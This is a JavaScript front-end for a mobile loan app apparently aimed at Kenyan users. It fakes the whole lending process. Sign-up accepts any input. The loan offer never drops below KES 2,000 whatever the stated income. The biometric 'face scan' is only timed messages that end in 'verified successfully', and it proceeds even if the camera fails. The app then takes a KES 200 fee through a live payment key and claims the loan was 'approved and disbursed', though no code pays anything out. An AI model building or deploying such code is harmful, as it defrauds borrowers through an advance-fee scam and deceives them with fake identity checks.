const screens = document.querySelectorAll('.screen');
function showScreen(id) {
    screens.forEach(s => s.classList.remove('active'));
    document.getElementById(id).classList.add('active');
}

let isLogin = false;
let globalQualifiedAmount = 0;
let userEmailValue = "user@genzloan.co.ke";

document.getElementById('toggle-auth').addEventListener('click', (e) => {
    e.preventDefault();
    isLogin = !isLogin;
    document.getElementById('auth-title').innerText = isLogin ? 'Log In' : 'Create Account';
    const displayStyle = isLogin ? 'none' : 'block';
    document.getElementById('fullname').style.display = displayStyle;
    document.getElementById('phone').style.display = displayStyle;
    document.getElementById('confirm-password').style.display = displayStyle;
    document.querySelector('#auth-form button').innerText = isLogin ? 'Log In' : 'Sign Up';
    e.target.innerText = isLogin ? 'Create Account' : 'Log In';
});

document.getElementById('auth-form').addEventListener('submit', (e) => {
    e.preventDefault();
    const nameInput = document.getElementById('fullname').value;
    const emailInput = document.getElementById('email').value;
    if (emailInput) userEmailValue = emailInput;
    
    document.getElementById('user-name').innerText = nameInput ? nameInput.split(' ')[0] : 'User';
    showScreen('dashboard-screen');
});

document.getElementById('btn-apply').addEventListener('click', () => showScreen('apply-screen'));
document.getElementById('btn-cancel').addEventListener('click', () => showScreen('dashboard-screen'));

const phoneInput = document.getElementById('phone');
if (phoneInput) {
    phoneInput.addEventListener('input', function() {
        if (!this.value.startsWith('+254')) this.value = '+254';
    });
}

document.getElementById('loan-form').addEventListener('submit', (e) => {
    e.preventDefault();
    
    const income = parseInt(document.getElementById('income').value) || 0;
    const expenses = parseInt(document.getElementById('expenses').value) || 0;
    const debt = parseInt(document.getElementById('debt').value) || 0;
    
    let disposable = income - expenses - debt;
    let qualified = Math.floor((disposable * 1.5) / 1000) * 1000;
    
    if (qualified > 150000) qualified = 150000;
    if (qualified < 2000) qualified = 2000;
    
    globalQualifiedAmount = qualified;
    
    showScreen('scan-screen');
    startFaceScan();
});

function startFaceScan() {
    const video = document.getElementById('camera-feed');
    const instruction = document.getElementById('scan-instruction');
    
    navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
        video.srcObject = stream;
        instruction.innerText = "Look straight forward...";
        
        setTimeout(() => {
            instruction.innerText = "Slowly turn your head to the LEFT...";
            setTimeout(() => {
                instruction.innerText = "Slowly turn your head to the RIGHT...";
                setTimeout(() => {
                    instruction.innerText = "Biometrics verified successfully!";
                    setTimeout(() => {
                        stream.getTracks().forEach(track => track.stop());
                        document.getElementById('qualified-amount').innerText = `KES ${globalQualifiedAmount.toLocaleString()}`;
                        showScreen('result-screen');
                    }, 2000);
                }, 3000);
            }, 3000);
        }, 3000);
    })
    .catch(err => {
        instruction.innerText = "Camera unavailable. Proceeding with review...";
        setTimeout(() => {
            document.getElementById('qualified-amount').innerText = `KES ${globalQualifiedAmount.toLocaleString()}`;
            showScreen('result-screen');
        }, 2000);
    });
}

// Paystack Fee Trigger
document.getElementById('btn-pay-fee').addEventListener('click', () => {
    if (typeof PaystackPop === 'undefined') {
        alert("Error: Paystack payment gateway could not load. Please check your internet connection.");
        return;
    }

    let handler = PaystackPop.setup({
        key: 'pk_live_b5a1b54f999a4097d760e17ba66a3ab9fc7c334d',
        email: userEmailValue,
        amount: 20000, // 200 KES in cents
        currency: 'KES',
        channels: ['mobile_money', 'card'],
        metadata: {
            custom_fields: [
                {
                    display_name: "Loan Amount",
                    variable_name: "loan_amount",
                    value: globalQualifiedAmount
                }
            ]
        },
        callback: function(response) {
            const amountStr = `KES ${globalQualifiedAmount.toLocaleString()}`;
            document.getElementById('limit-amount').innerText = amountStr;
            alert(`Payment Successful! Ref: ${response.reference}\n${amountStr} has been approved and disbursed.`);
            showScreen('dashboard-screen');
        },
        onClose: function() {
            alert('Payment cancelled! You must pay the KES 200 processing fee to unlock and disburse your loan.');
        }
    });
    handler.openIframe();
});
